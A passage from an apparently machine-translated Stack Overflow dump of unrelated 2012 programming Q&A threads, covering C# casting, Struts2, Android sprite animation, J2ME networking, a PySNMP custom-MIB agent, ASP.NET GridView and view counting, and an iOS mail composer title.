ParentDTO dto = new MyDTO();
c.CreateUser(dto); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:06:45.417

您创建了 class 的实例`ParentDTO`。将其强制转换为`MyDTO`正确会产生此异常，因为实例实际上是 type`ParentDTO`而不是 type `MyDTO`。
您在那里拥有的对象实例没有带有 name 的属性`MyID`，它根本不存在，因此无法获得该值 - 不存在 - 值。

也许你应该描述你想要达到的目标。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:12:22.310

> *有人可以告诉我如何在 ClassC 的 CreateUser 方法中投射 DTO*

没门。您在声明中使用基类型创建了基类型的对象。您不能将其转换为派生类型，这是非法的。采用

`ParentDTO dto=new MyDto();`

读[这个](http://msdn.microsoft.com/en-us/library/ms173105.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T14:02:24.697

其他答案是正确的，但是通过更好地理解“静态类型”和“运行时类型”之间的区别，这种行为的原因会更清楚，他们没有讨论。静态类型是 C# 代码中变量的类型，而运行时类型是内存中实际对象的类型。

我们都知道静态类型和运行时类型可能不同。考虑：

```
class A { }
class B : A { }

A a = new B(); 
```

变量`a`引用类型的实例`B`。变量的静态类型是`A`，但对象的运行时类型是`B`。

我们也可以认为`a`持有*类型 A 的引用，*该引用指向*类型 B 的实例*。当且仅当类型 B 派生自（或等于）类型 A 时才允许这样做。

因此，以下情况是不允许的：

```
B b = new A(); 
```

在这里，您试图将对类型 A（运行时类型）的实例的引用分配给（静态）类型 B 的变量。A 不是派生自或等于 B，因此不允许分配。同样，不允许进行以下分配：

```
string s = new object();
MyDTO dto = new ParentDTO(); 
```

强制转换运算符使事情有些复杂，但根本问题是相同的：*您试图将引用设置为指向其运行时类型不是派生自或等于引用的静态类型的对象：*

```
A a1 = new A();
B b1 = new B();

A a2 = (A)b1;  // fine, because B is derived from A
B b2 = (B)a1;  // not allowed, because A is not derived from B. 
```

`object`同样，如果我们替换`A`和`string`，这可能更有意义`B`：

```
object a1 = new object();
string b1 = "Hello, World!";

object a2 = (object)b1;  // a2 now points to the string "Hello, World!";
string b2 = (string)a1;  // cast fails: the string variable can't point to an instance of `object` 
```

同样，对于您的类型：

```
ParentDTO a1 = new ParentDTO();
MyDTO     b1 = new MyDTO();

ParentDTO a2 = (ParentDTO)b1;  // works
MyDTO     b2 = (MyDTO)a1;;     // doesn't 
```

# struts2 - struts 2：如何将全局参数从一个动作传递到另一个动作

> ID：12215933
> 
> 赞同：0
> 
> 时间：2012-08-31T13:02:16.253
> 
> 标签：struts2

我有一个这样的案例：

JSP -> 动作 1 -> 重定向 -> 动作 2 -> JSP

在重定向时，我们会丢失所有参数。但是有一个参数我想从一个动作传递到另一个动作。对于所有操作，该参数始终相同。

我知道可以编写以下代码并且它可以工作：

```
<action name="myAction" class="myActionClass" method="doThis">
    <result name="success" type="redirect">doThat.action?myParam=${myParam}</result>
</action> 
```

唯一的事情是，当我有重定向时，我想将参数从一个动作自动传递到另一个动作，而无需在我的动作标签中写入任何内容，但我不知道如何对其进行编码。

struts 2可以做到这一点吗？

有人建议把它放在全局结果中，我试过了，但还是没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:22:35.390

您可以将属性作为属性设置到会话中，并且可以从会话中取回相同的属性，而与您使用的操作类无关。session.setAttribute(name,value); session.getAttribute(名称)

# java - Android 位图动画

> ID：12215934
> 
> 赞同：0
> 
> 时间：2012-08-31T13:02:27.897
> 
> 标签：java, android, android-animation, game-engine

我正在将位图动画添加到我的简单 2D android 游戏引擎中（如果您还可以调用它的话.. :D）并且我正面临以预定义的 FPS/速率循环帧的问题。

我现在所做的只是使用 System 获取 currentTimeMillis 并将其用作参考，但我很确定这不是最好的决定。我想我可以将当​​前帧传递给绘图方法并将其用于绘图方法。

目前我有你从中获取可绘制对象的对象，我在渲染器上使用它，如下所示：

```
canvas.drawBitmap(animation.getDrawable(), (int)x, (int)y, null); 
```

并且 getDrawable() 返回动画的当前帧或唯一的帧，如果它的静止图像和这里的代码

```
 if(frames.size() > 1) {
            long current = System.currentTimeMillis();
            if (currentFrame == frames.size() - 1 && frameDirection == 1) {
                frameDirection = -1;
            } else if (currentFrame == 0 && frameDirection == -1) {
                frameDirection = 1;
            }
            if ((current - lastFrame) > delay) {
                currentFrame += frameDirection;
                lastFrame = current;
            }
        }
        return frames.get(currentFrame); 
```

在我看来，这看起来很糟糕而且效率低下。我能做些什么呢？将当前帧传递给 getDrawable 的唯一方法是或者应该如何完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T15:45:05.753

如果我理解正确，您想为您的游戏引擎创建一个动画类吗？

在我的游戏引擎中，我有一个名为 的类`SpriteSheetAnimation`，当调用 update 方法时，它基本上会遍历动画的每一帧——我相信你会理解它背后的逻辑，你会找到一种使用它的方法：

```
public class SpriteSheetAnimation extends GameObjectTemplate {

    int animationSheetLength;
    int animationSheetHeight;
    int columns;
    int rows;
    Rect srcRect;

    int left;
    int bottom;
    int lengthOfSpriteInSheet;
    int heightOfSpriteInSheet;

    boolean repeatAnimation;
    boolean animationCompleted;
    boolean animationStarted;

    Bitmap bitmap;

    /**
     * You input a bitmap and the number of sprites (by defining the number of rows and columns), and this class will
     * take care of animating the sheet. 
     * 
     */

    public SpriteSheetAnimation(WorldTemplate world, Bitmap animationSheet, int amountOfRows, int amountOfColumns) {
        super(world);
        this.animationSheetLength = animationSheet.getWidth();
        this.animationSheetHeight = animationSheet.getHeight();
        this.columns = amountOfColumns;
        this.rows = amountOfRows;
        this.lengthOfSpriteInSheet = this.animationSheetLength/this.columns;
        this.heightOfSpriteInSheet = this.animationSheetHeight/this.rows;
        srcRect = new Rect();

        left = 0;
        bottom = this.heightOfSpriteInSheet;

        repeatAnimation = false;
        animationCompleted = false;
        animationStarted = false;

        this.bitmap = animationSheet;
        this.drawShapesOfSprites = true;

        this.gameObjectShape.addRectangle(new Rect(0, 0, 0 + this.heightOfSpriteInSheet, 0 + this.lengthOfSpriteInSheet));

    }

    @Override
    public void defineGameObjectPositionShape() {
        this.gameObjectShape.addRectangle(new Rect());

    }

    /**
     * <b><i>public Rect getSrcRect()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * Retrieve the rect that will cover the current source of the sheet.
     * 
     * @return 
     * The current rect that will cover the current source of the sheet.
     *
     */

    public Rect getSrcRect() {
        return srcRect;
    }

    /**
     * <b><i>public Rect getDstRect()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * Retrieve the rect where the bitmap will be scaled to fit into.
     * 
     * @return 
     * The current rect where the bitmap will be scaled to fit into.
     *
     */

    public Rect getDstRect() {
        return this.getGameObjectPositionRect();
    }

    /**
     * <b><i>public void repeatAnimation(boolean repetition)</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * This method will set if the animation should be repeated or not.
     * 
     * @param state 
     * <br><br>
     * 1\. True = The animation will repeat once completed and keep on doing so.
     * <br><br>
     * 2\. False = The animation will play only once.
     *
     *      
     */

    public void repeatAnimation(boolean repetition) {
        this.repeatAnimation = repetition;
    }

    /**
     * <b><i>public boolean isAnimationFinished()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * Retrieve if the animation has finished.
     * 
     * @return 
     * If the animation has finished.
     *
     */

    public boolean isAnimationFinished() {
        return animationCompleted;
    }

    /**
     * <b><i>public boolean hasBeenStarted()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * Retrieve if the animation has started.
     * 
     * @return 
     * If the animation has started.
     *
     */

    public boolean hasBeenStarted() {
        return animationStarted;
    }

    /**
     * <b><i>public void render()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * This method will render the animation (the current picture of the sheet).
     *
     */

    public void render() {
        world.game.getGraphics().getCanvasGameScreen().drawBitmap(this.bitmap, this.getSrcRect(), this.getGameObjectPositionRect(), null);
    }

    /**
     * <b><i>public void update()</i></b>
     * <br>
     * Since: API 1
     * <br>
     * <br>
     * This method will update the animation.
     *
     */

    @Override
    public void update() {
        // Every update will advance to the next frame of the animation
        // Set if animation has started
        if(!animationStarted) {
            animationStarted = true;
        }

        // Set the frame
        srcRect.set(left, (bottom - this.heightOfSpriteInSheet), (left + this.lengthOfSpriteInSheet), bottom);
        // Change the location, so the next time the frame is set, it will be set accordingly
        left = left + this.lengthOfSpriteInSheet;

        if(left == this.animationSheetLength && bottom == this.animationSheetHeight) {
            if(repeatAnimation == true) {
                left = 0;
                bottom = 0;
            }
            else {
                animationCompleted = true;
            }
        }

        if(left == this.animationSheetLength) {
            bottom = bottom + this.heightOfSpriteInSheet;
            left = 0;
        }

    }

} 
```

我希望这对您有所帮助并帮助您入门。

# debugging - 如何使 ndk 调试器忽略包含的源

> ID：12215937
> 
> 赞同：2
> 
> 时间：2012-08-31T13:02:39.260
> 
> 标签：debugging, android-ndk, gdb

如何使 ndk-debugger 忽略包含的源代码。我的 ndk-debug 会话在 epoll_wait 处停止。它说没有可用的来源。显然这是因为这只是 /include/sys/epoll.h 中的一个包含文件。我怎样才能让 ndk-debugger 跳过这种愚蠢的停止并使用代码告诉我代码在哪里运行。我的代码应该继续并忽略这一点，并知道这是一个包含文件。我无法在正确调试时提供所有包含文件源代码。但是我的调试会话不应该在这样的事情上停止。请让我知道是否有解决方案。

# java-me - J2ME：HttpConnection 没有立即关闭

> ID：12215939
> 
> 赞同：1
> 
> 时间：2012-08-31T13:02:55.770
> 
> 标签：java-me, nokia, midp, httpconnection

我开发了一个使用 HttpConnection 的 midlet。有一个单独的线程进行连接。

现在我所做的是在该线程上提供另一个名为 cancel() 的方法，即使在 run() 方法中使用 HttpConnection 时，它也会调用 HttpConnection.close()。

这样我有点中断/取消连接。这在我的 sun 无线仿真器上运行良好，但不适用于诺基亚设备和诺基亚 SDK2。

是否有可能一个线程正在使用 HttpConnection 而另一个线程正在调用 close() ？我期待抛出异常，但 midlet 挂起。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T07:47:02.553

在执行 IO 时，您需要注意大多数方法可能会阻塞，除非文档中另有说明。HTTPConnection.close() 就是这样一种方法。

我的猜测（因为您没有共享任何代码）是您从主 GUI 线程调用 close() 并因此在方法阻塞时挂起 MIDlet。最好的方法可能是在执行连接的线程中设置一个“中止”布尔值并在战略位置检查它。作为替代方案，您可以生成一个“关闭线程”来执行可能阻塞的关闭调用。

# javascript - 用于下拉选择框选项的专用按钮/div

> ID：12215940
> 
> 赞同：0
> 
> 时间：2012-08-31T13:03:06.470
> 
> 标签：javascript, select

是否可以通过为此制作专用按钮/ div 来使选择框下拉？

例如：[jsFIddle](http://jsfiddle.net/MS5sM/1/) - 我希望在单击橙色矩形时下拉选择框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:11:43.570

我想这个可能对你有帮助

```
<select id="tst" >
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
<option>option</option>
</select>

<input type="button" name="" value="Open" onclick="document.getElementById('tst').size='10';"/>
<input type="button" name="" value="Close" onclick="document.getElementById('tst').size='1';"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:15:15.957

一个简单的解决方案是调用 select.click() 方法，但这不起作用。这是一个可以为您解决问题的库：[http ://code.google.com/p/expandselect/](http://code.google.com/p/expandselect/)

# snmp - 在 PySNMP 代理中实现自定义 MIB

> ID：12215942
> 
> 赞同：1
> 
> 时间：2012-08-31T13:03:08.000
> 
> 标签：snmp, pysnmp

我在 PySNMP 代理中实现自定义 MIB 时遇到困难。

我开始了：

[http://pysnmp.sourceforge.net/examples/4.x/v3arch/agent/cmdrsp.html](http://pysnmp.sourceforge.net/examples/4.x/v3arch/agent/cmdrsp.html)

创建了我自己的 MIB 文件，用于`build-pysnmp-mib`制作 Python 模块并成功导入符号。

我看不出下一步该去哪里。我需要以某种方式将导入的符号安装在服务的 MIB 列表上并提供一个实现。（它目前是一个具有一个只读 INTEGER 属性的 MIB。）

MIB 文件在`smilint`没有警告的情况下通过，但我不得不手动将缺少的`MibScalar`导入添加到生成的模块中。

MIB：

```
TRS-MIB DEFINITIONS ::= BEGIN

internet OBJECT IDENTIFIER ::= { iso(1) org(3) dod(6) 1 }
enterprises OBJECT IDENTIFIER ::= { internet private(4) 1 }
thorcom OBJECT IDENTIFIER ::= { enterprises 27817 }
trs OBJECT IDENTIFIER ::= { thorcom 2 }
trsEntry OBJECT IDENTIFIER ::= { trs 1 }

trsDeliveryTime OBJECT-TYPE
    SYNTAX Integer32
    ACCESS not-accessible
    STATUS mandatory
    DESCRIPTION "Average message delivery time in milliseconds."
    ::= { trsEntry 1 }

END 
```

代码：

```
#!/usr/bin/env python

# Command Responder
from pysnmp.entity import engine, config
from pysnmp.carrier.asynsock.dgram import udp
#from pysnmp.carrier.asynsock.dgram import udp6
from pysnmp.entity.rfc3413 import cmdrsp, context
from pysnmp.proto.rfc1902 import OctetString
from pysnmp.smi import builder
from pysnmp import debug

debug.setLogger(debug.Debug('all'))

# Create SNMP engine with autogenernated engineID and pre-bound
# to socket transport dispatcher
snmpEngine = engine.SnmpEngine()

# Setup UDP over IPv4 transport endpoint
config.addSocketTransport(
    snmpEngine,
    udp.domainName,
    udp.UdpSocketTransport().openServerMode(('127.0.0.1', 161))
    )

# Start of new code
mibBuilder = snmpEngine.msgAndPduDsp.mibInstrumController.mibBuilder
mibSources = mibBuilder.getMibSources() + (
  builder.DirMibSource('.'),
)
mibBuilder.setMibSources(*mibSources)

# Create and put on-line my managed object
deliveryTime, = mibBuilder.importSymbols('TRS-MIB', 'trsDeliveryTime')
Integer32, = snmpEngine.msgAndPduDsp.mibInstrumController.mibBuilder.importSymbols('SNMPv2-SMI', 'Integer32')

MibScalarInstance, = mibBuilder.importSymbols('SNMPv2-SMI', 'MibScalarInstance')
class MyDeliveryTime(Integer32):
  def readGet(self, name, val, idx, (acFun, acCtx)):
    return name, self.syntax.clone(42)

deliveryTimeInstance = MibScalarInstance(
  deliveryTime.name, (0,), deliveryTime.syntax
)
mibBuilder.exportSymbols('TRS-MIB', deliveryTimeInstance=deliveryTimeInstance)  # creating MIB
# End of new code

# v1/2 setup
config.addV1System(snmpEngine, 'test-agent', 'public')

# v3 setup
config.addV3User(
    snmpEngine, 'test-user',
    config.usmHMACMD5AuthProtocol, 'authkey1',
    config.usmDESPrivProtocol, 'privkey1'
    )

# VACM setup
config.addContext(snmpEngine, '')
config.addRwUser(snmpEngine, 1, 'test-agent', 'noAuthNoPriv', (1,3,6)) # v1
config.addRwUser(snmpEngine, 2, 'test-agent', 'noAuthNoPriv', (1,3,6)) # v2c
config.addRwUser(snmpEngine, 3, 'test-user', 'authPriv', (1,3,6)) # v3

# SNMP context
snmpContext = context.SnmpContext(snmpEngine)

# Apps registration
cmdrsp.GetCommandResponder(snmpEngine, snmpContext)
cmdrsp.SetCommandResponder(snmpEngine, snmpContext)
cmdrsp.NextCommandResponder(snmpEngine, snmpContext)
cmdrsp.BulkCommandResponder(snmpEngine, snmpContext)
snmpEngine.transportDispatcher.jobStarted(1) # this job would never finish
snmpEngine.transportDispatcher.runDispatcher() 
```

生成并修改 TRS-MIB.py：

```
# PySNMP SMI module. Autogenerated from smidump -f python TRS-MIB
# by libsmi2pysnmp-0.1.1 at Fri Aug 31 13:56:45 2012,
# Python version (2, 6, 6, 'final', 0)

# Imported just in case new ASN.1 types would be created
from pyasn1.type import constraint, namedval

# Imports

( Integer, ObjectIdentifier, OctetString, ) = mibBuilder.importSymbols("ASN1", "Integer", "ObjectIdentifier", "OctetString")
( Bits, Integer32, MibIdentifier, MibScalar, TimeTicks, ) = mibBuilder.importSymbols("SNMPv2-SMI", "Bits", "Integer32", "MibIdentifier", "MibScalar", "TimeTicks")

# Objects

internet = MibIdentifier((1, 3, 6, 1))
enterprises = MibIdentifier((1, 3, 6, 1, 4, 1))
thorcom = MibIdentifier((1, 3, 6, 1, 4, 1, 27817))
trs = MibIdentifier((1, 3, 6, 1, 4, 1, 27817, 2))
trsEntry = MibIdentifier((1, 3, 6, 1, 4, 1, 27817, 2, 1))
trsDeliveryTime = MibScalar((1, 3, 6, 1, 4, 1, 27817, 2, 1, 1), Integer32()).setMaxAccess("noaccess")
if mibBuilder.loadTexts: trsDeliveryTime.setDescription("Average message delivery time in milliseconds.")

# Augmentions

# Exports

# Objects
mibBuilder.exportSymbols("TRS-MIB", internet=internet, enterprises=enterprises, thorcom=thorcom, trs=trs, trsEntry=trsEntry, trsDeliveryTime=trsDeliveryTime) 
```

更新：

我现在还剩下一个错误：

```
$ snmpget -v2c -c public localhost .1.3.6.1.4.1.27817.2.1.1
Error in packet
Reason: noAccess
Failed object: iso.3.6.1.4.1.27817.2.1.1 
```

调试是：

```
DBG: handle_read: transportAddress ('127.0.0.1', 48191) incomingMessage '0,\x02\x01\x01\x04\x06public\xa0\x1f\x02\x04>9\xc4\xa0\x02\x01\x00\x02\x01\x000\x110\x0f\x06\x0b+\x06\x01\x04\x01\x81\xd9)\x02\x01\x01\x05\x00'
DBG: receiveMessage: msgVersion 1, msg decoded
DBG: prepareDataElements: Message:
 version='version-2'
 community=public
 data=PDUs:
  get-request=GetRequestPDU:
   request-id=1043973280
   error-status='noError'
   error-index=0
   variable-bindings=VarBindList:
    VarBind:
     name=1.3.6.1.4.1.27817.2.1.1
     =_BindValue:
      unSpecified=

DBG: value index rebuilt at (1, 3, 6, 1, 6, 3, 18, 1, 1, 1, 2), 1 entries
DBG: processIncomingMsg: looked up securityName MibScalarInstance((1, 3, 6, 1, 6, 3, 18, 1, 1, 1, 3, 116, 101, 115, 116, 45, 97, 103, 101, 110, 116), test-agent) contextEngineId MibScalarInstance((1, 3, 6, 1, 6, 3, 18, 1, 1, 1, 4, 116, 101, 115, 116, 45, 97, 103, 101, 110, 116), �O�c�@��) contextName MibScalarInstance((1, 3, 6, 1, 6, 3, 18, 1, 1, 1, 5, 116, 101, 115, 116, 45, 97, 103, 101, 110, 116), ) by communityName MibScalarInstance((1, 3, 6, 1, 6, 3, 18, 1, 1, 1, 2, 116, 101, 115, 116, 45, 97, 103, 101, 110, 116), public)
DBG: processIncomingMsg: generated maxSizeResponseScopedPDU 65379 securityStateReference 12831470
DBG: prepareDataElements: SM returned securityEngineID SnmpEngineID(hexValue='8004fb857f00163de40e2b7') securityName test-agent
DBG: prepareDataElements: cached by new stateReference 2662033
DBG: receiveMessage: MP succeded
DBG: receiveMessage: PDU GetRequestPDU:
 request-id=1043973280
 error-status='noError'
 error-index=0
 variable-bindings=VarBindList:
  VarBind:
   name=1.3.6.1.4.1.27817.2.1.1
   =_BindValue:
    unSpecified=

DBG: receiveMessage: pduType TagSet(Tag(tagClass=128, tagFormat=32, tagId=0))
DBG: processPdu: stateReference 2662033, varBinds [(ObjectName(1.3.6.1.4.1.27817.2.1.1), Null(''))]
DBG: getMibInstrum: contextName "", mibInstum <pysnmp.smi.instrum.MibInstrumController instance at 0x7fcbfe3d5e60>
DBG: flipFlopFsm: inputNameVals [(ObjectName(1.3.6.1.4.1.27817.2.1.1), Null(''))]
DBG: flipFlopFsm: state start status ok -> fsmState readTest
DBG: flipFlopFsm: fun <bound method MibTree.readTest of MibTree((1,), None)> failed NoAccessError({'name': (1, 3, 6, 1, 4, 1, 27817, 2, 1, 1), 'idx': 0}) for 1.3.6.1.4.1.27817.2.1.1=Null('')
DBG: flipFlopFsm: state readTest status err -> fsmState stop
DBG: sendRsp: stateReference 2662033, errorStatus noAccess, errorIndex 1, varBinds [(ObjectName(1.3.6.1.4.1.27817.2.1.1), Null(''))]
DBG: returnResponsePdu: PDU ResponsePDU:
 request-id=1043973280
 error-status='noAccess'
 error-index=1
 variable-bindings=VarBindList:
  VarBind:
   name=1.3.6.1.4.1.27817.2.1.1
   =_BindValue:
    unSpecified=

DBG: prepareResponseMessage: cache read msgID 1043973280 transportDomain (1, 3, 6, 1, 6, 1, 1) transportAddress ('127.0.0.1', 48191) by stateReference 2662033
DBG: prepareResponseMessage: using contextEngineId SnmpEngineID(hexValue='8004fb857f00163de40e2b7') contextName 
DBG: generateResponseMsg: recovered community public by securityStateReference 12831470
DBG: generateResponseMsg: Message:
 version='version-2'
 community=public
 data=PDUs:
  response=ResponsePDU:
   request-id=1043973280
   error-status='noAccess'
   error-index=1
   variable-bindings=VarBindList:
    VarBind:
     name=1.3.6.1.4.1.27817.2.1.1
     =_BindValue:
      unSpecified=

DBG: returnResponsePdu: MP suceeded
DBG: receiveMessage: processPdu succeeded
DBG: handle_write: transportAddress ('127.0.0.1', 48191) outgoingMessage '0,\x02\x01\x01\x04\x06public\xa2\x1f\x02\x04>9\xc4\xa0\x02\x01\x06\x02\x01\x010\x110\x0f\x06\x0b+\x06\x01\x04\x01\x81\xd9)\x02\x01\x01\x05\x00' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T14:59:47.527

至于实现托管对象实例，您有两种选择：

1.  加载 MibScalarInstance 类并将其子类化，然后覆盖其 readGet() 方法以使其返回您的实时值。然后实例化您的新类（确保将其传递给识别它的适当 OID）并将其传递给 exportSymbols()，因此其 OID 将在 pysnmp 代理中注册。

2.  加载 Integer32 类，对其进行子类化并覆盖其“clone()”方法以使其返回您的实时值。然后加载 MibScalarInstance 类，通过适当的 OID 和 Integer32 子类的实例对其进行实例化，然后将 MibScalarInstance 对象传递给 exportSymbols()，因此它的 OID 将在 pysnmp 代理中注册。

将所有代码保存在自己的 MIB 模块中可能是有意义的。查看 pysnmp/smi/mibs/instances/*.py 以获得一个想法。

在您的代理应用程序中，调用 mibBuilder.loadModules('TRC-MIB') 以将您的 MIB 模块加载到代理中。

在您的代码中，您似乎以某种方式结合了上述两种方法： MyDeliveryTime.readGet() 不起作用，但是 MyDeliveryTime.clone() 或 deliveryTimeInstance.readGet() 会。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-12T05:29:15.930

我也遇到了类似的问题：

尝试将 MY-MIB.[pyc] 文件放在 ~/.pysnmp/mibs 文件夹中，但我认为真正有效的是将这些文件放在文件夹 /usr/lib/pytho*/site/pysnmp/smi/mibs/ 中。

我正在研究 pysnmp-4.3.9

# c# - 数据视图中的下拉菜单

> ID：12215943
> 
> 赞同：0
> 
> 时间：2012-08-31T13:03:10.793
> 
> 标签：c#, .net-3.5, asp.net-3.5, dataview

在我的 GridView 中，我有以下列：

```
<Columns>  
    <asp:BoundField DataField="report_type" HeaderText="Report Type"   
        SortExpression="report_type" />  

    <asp:BoundField DataField="progress" HeaderText="Progress"   
        SortExpression="progress" />  

    <asp:TemplateField HeaderText="..">
        <ItemTemplate>
            <asp:DropDownList ID="DropDownList1" runat="server" DataValueField="progress">
                <asp:ListItem Value="0">Incomplete</asp:ListItem>
                <asp:ListItem Value="1">Complete</asp:ListItem>
            </asp:DropDownList>
        </ItemTemplate>
    </asp:TemplateField> 
</Columns> 
```

进度列仅用于演示目的，最终将被删除。如何获取进度值以在下拉列表中选择正确的项目列表？

因此，如果值为 ，`progress`则应选择`1`下拉菜单`Complete`。如果 的值为 ，`progress`则应选择`0`下拉菜单`Incomplete`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T14:00:26.650

在 .aspx 页面的 gridview 中添加 OnRowDataBound 属性：

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
    DataKeyNames="id" OnRowDataBound="GridViewRowEventHandler"> 
```

代替

```
<asp:BoundField DataField="Progress" HeaderText="Progress"   
    SortExpression="progress" /> 
```

和

```
<asp:TemplateField>
   <ItemTemplate>             
       <asp:Label ID="progress_Flags" runat="server" Text='<%# DataBinder.Eval(Container.DataItem, "Progress").ToString()%>'/>
  </ItemTemplate>                    
</asp:TemplateField> 
```

在后面的代码中：

```
protected void GridViewRowEventHandler(Object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
       Label flag = (Label)e.Row.FindControl("progress_Flags");
       DropDownList myDropDown = (DropDownList)e.Row.FindControl("DropDownList1");
        if (flag.Text == "1")
        {
            myDropDown.SelectedValue = "1";
        }
    //add more conditions here..

    }          
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:51:18.793

如果`RowDataBound`您可以使用`e.Row.FindControl`

```
protected void GridView_OnRowDataBound(object sender, GridViewRowEventArgs e)
{

   GridViewRow row = e.Row;
   DataRowView dr = row.DataItem as DataRowView;
   // now find the control in the row by control ID
   DropDownList myDropDown = row.FindControl("DropDownList1") as DropDownList;
} 
```

# asp.net-mvc-3 - 如何统计用户的浏览量？

> ID：12215951
> 
> 赞同：1
> 
> 时间：2012-08-31T13:03:41.967
> 
> 标签：asp.net-mvc-3

我想计算用户观看产品的次数。

产品具有整数类型的**ViewCount**属性，在 Details 视图中，我增加**ViewCount**：

```
public ActionResult Details( int id )
  {
    ...
    product.ViewCount = product.ViewCount + 1;
    db.SaveChanges();
    return View( product );
  } 
```

但在每次刷新时，ViewCount 都会增加。

我应该怎么做 ViewCount 在每个用户会话中增加 1 倍？

或者其他方式，正确的标签，任何链接，请。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T15:15:51.873

你可以使用cookie。

```
var productId = 1;

if (Request.Cookies["ViewedPage"] != null)
{
    if (Request.Cookies["ViewedPage"][string.Format("pId_{0}",productId )] == null)
    {
        HttpCookie cookie = (HttpCookie)Request.Cookies["ViewedPage"];
        cookie[string.Format("pId_{0}",productId )] = "1";
        cookie.Expires = DateTime.Now.AddDays(1);
        Response.Cookies.Add(cookie); 

        db.Execute("UPDATE Products SET ViewCount = ViewCount + 1 WHERE ProductId = @id", new { id = productId } ); 
        db.SaveChanges();
    }
}
else
{
    HttpCookie cookie = new HttpCookie("ViewedPage");
    cookie[string.Format("pId_{0}",productId )] = "1";
    cookie.Expires = DateTime.Now.AddDays(1);
    Response.Cookies.Add(cookie); 

    db.Execute("UPDATE Products SET ViewCount = ViewCount + 1 WHERE ProductId = @id", new { id = productId } ); 
    db.SaveChanges();
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T15:10:51.350

我建议您创建一些操作过滤器来跟踪它。

```
public class TrackFilter: IResultFilter
{
  public void OnResultExecuting(ResultExecutingContext filterContext)
  {

  }

  public void OnResultExecuted(ResultExecutedContext filterContext)
  {
    // do a database call and update the count
  }
}

[Track]
public ActionResult Details(int id)
{
} 
```

您也可以参考此[线程](http://weblogs.asp.net/shijuvarghese/archive/2011/07/18/user-activity-logging-in-asp-net-mvc-app-using-action-filter-and-log4net.aspx)以获得更多想法。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T13:16:10.760

您的代码不是线程安全的：如果两个用户同时访问该页面，则 ViewCount 将增加 1 而不是 2（因为该值由 DB 使用者而不是 DB 本身增加）。您可以通过直接运行 SQL 来解决此问题`UPDATE Products SET ViewCount = ViewCount + 1 WHERE ProductId = @id`。您的 DBMS 将提供并发保护。

无论如何，为了防止视图计数因同一会话中的其他视图而增加，只需使用存储在会话中的哈希集，如下所示：

```
public ActionResult Details(Int32 id ) {

    HashSet<Int32> productsSeen = (HashSet<Int32>)Session["ProductsSeen"];
    if( productsSeen == null ) {
        Session["ProductsSeen"] = productsSeen = new HashSet<Int32>();
    }

    if( !productsSeen.Contains( id ) ) {

        db.Execute("UPDATE Products SET ViewCount = ViewCount + 1 WHERE ProductId = @id", new { id = id } ); // psuedocode. This isn't a real EF construct.
        db.SaveChanges();
    }

    return View( product );
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-03-25T19:34:18.993

```
model.ViewCount = model.ViewCount + 1;

_context.Entry(model);

_context.SaveChanges();

return View(model); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-23T13:04:08.807

这是改进的 Dai 代码。您必须添加 productsSeen.Add(id); 在第二个 if 语句中

```
public ActionResult Details(Int32 id ) {

    HashSet<Int32> productsSeen = (HashSet<Int32>)Session["ProductsSeen"];
    if( productsSeen == null ) {
        Session["ProductsSeen"] = productsSeen = new HashSet<Int32>();
    }

    if( !productsSeen.Contains( id ) ) {
        productsSeen.Add( id );
        db.Execute("UPDATE Products SET ViewCount = ViewCount + 1 WHERE ProductId = @id", new { id = id } ); // psuedocode. This isn't a real EF construct.
        db.SaveChanges();
    }

    return View( product );
} 
```

# ios - Changing navigation bar title in MFMailComposeViewController

> ID：12215954
> 
> 赞同：1
> 
> 时间：2012-08-31T13:03:58.957
> 
> 标签：ios, mfmailcomposeviewcontroller, navigationbar

It seems like I am not able to change the title on the navigation bar, which gets set to the Subject of the email (in this case "My Subject"). In this case I'd like to get rid of the title, either using an empty string as title or rendering the title invisible.

```
MFMailComposeViewController *mfViewController = [[MFMailComposeViewController alloc] init];
mfViewController.mailComposeDelegate = self;       
[mfViewController setSubject:[NSString stringWithFormat:@"My Subject"]];
[mfViewController setMessageBody:[self emailBody] isHTML:NO];
[mfViewController setTitle:@""]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:25:32.333

where u have presented ModalViewController

```
[self presentModalViewController:controller animated:YES]; // Existing line 
```

add

```
[[[[controller viewControllers] lastObject] navigationItem] setTitle:@"Set the title"]; 
```

I believe this is some kind of protection came with iOS4.

It is clearly stated here that you MUST NOT change the interface provided by Apple.

[http://developer.apple.com/library/ios/#documentation/MessageUI/Reference/MFMailComposeViewController_class/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/MessageUI/Reference/MFMailComposeViewController_class/Reference/Reference.html)

